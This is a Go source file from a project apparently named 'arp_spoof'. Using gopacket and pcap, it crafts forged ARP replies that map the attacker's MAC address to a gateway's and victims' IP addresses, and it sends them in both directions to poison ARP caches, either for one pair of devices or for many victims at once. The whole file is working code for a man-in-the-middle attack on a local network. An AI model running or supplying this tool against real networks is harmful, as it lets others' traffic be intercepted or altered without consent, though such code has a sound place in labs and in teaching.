package arp

import (
	"arp_spoof/network"
	"fmt"
	"net"
	"sync"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

func sendARPReply(from, to, attackerInfo *network.DeviceInfo, deviceHandle *pcap.Handle) error {
	eth := layers.Ethernet{
		SrcMAC:       attackerInfo.MAC,
		DstMAC:       to.MAC,
		EthernetType: layers.EthernetTypeARP,
	}

	arp := layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPReply,
		SourceHwAddress:   attackerInfo.MAC,
		SourceProtAddress: from.IP.To4(),
		DstHwAddress:      to.MAC,
		DstProtAddress:    to.IP.To4(),
	}

	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	if err := gopacket.SerializeLayers(buf, opts, &eth, &arp); err != nil {
		return err
	}

	if err := deviceHandle.WritePacketData(buf.Bytes()); err != nil {
		return err
	}

	return nil
}

// TODO
func PoisonARPCacheMultiple(gateway net.IP, victims []net.IP, attackerInfo *network.DeviceInfo, deviceHandle *pcap.Handle) error {
	var wg sync.WaitGroup

	gatewayDevice, err := network.MapIPstoMAC([]net.IP{gateway})
	if err != nil {
		return err
	}

	for _, victim := range victims {
		wg.Add(1)

		go func(victim net.IP) {
			defer wg.Done()
			defer func() {
				if err := recover(); err != nil {
					fmt.Println("error in sending ARP reply")
				}
			}()

			victimDevice, err := network.MapIPstoMAC([]net.IP{victim})
			if err != nil {
				panic(err)
			}

			if err := sendARPReply(gatewayDevice[0], victimDevice[0], attackerInfo, deviceHandle); err != nil {
				panic(err)
			}

			if err := sendARPReply(victimDevice[0], gatewayDevice[0], attackerInfo, deviceHandle); err != nil {
				panic(err)
			}

		}(victim)

	}
	wg.Wait()

	return nil
}

func PoisonARPCache(devicesInfo []*network.DeviceInfo, attackerInfo *network.DeviceInfo, deviceHandle *pcap.Handle) error {
	dev1 := devicesInfo[0]
	dev2 := devicesInfo[1]

	if err := sendARPReply(dev1, dev2, attackerInfo, deviceHandle); err != nil {
		return err
	}

	if err := sendARPReply(dev2, dev1, attackerInfo, deviceHandle); err != nil {
		return err
	}

	return nil
}
